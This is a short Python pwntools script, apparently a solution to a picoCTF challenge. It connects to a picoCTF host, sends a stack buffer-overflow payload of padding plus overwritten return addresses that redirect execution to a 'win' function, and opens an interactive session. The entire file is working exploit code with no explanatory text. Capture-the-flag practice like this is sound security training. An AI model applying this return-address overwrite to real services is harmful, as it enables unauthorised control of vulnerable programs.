from pwn import *
from binascii import unhexlify
r = remote("saturn.picoctf.net", 49762)
pad = b"a"*14
ret = p32(0x08049da0)
main_addr = p32(0x8049f00)
cons_addr = p32(0x08049e20)
win_addr = p32(0x08049da0)
payload = pad + win_addr + cons_addr + main_addr
print(r.recvuntil(b'the flag\n'))
r.sendline(payload)
r.interactive()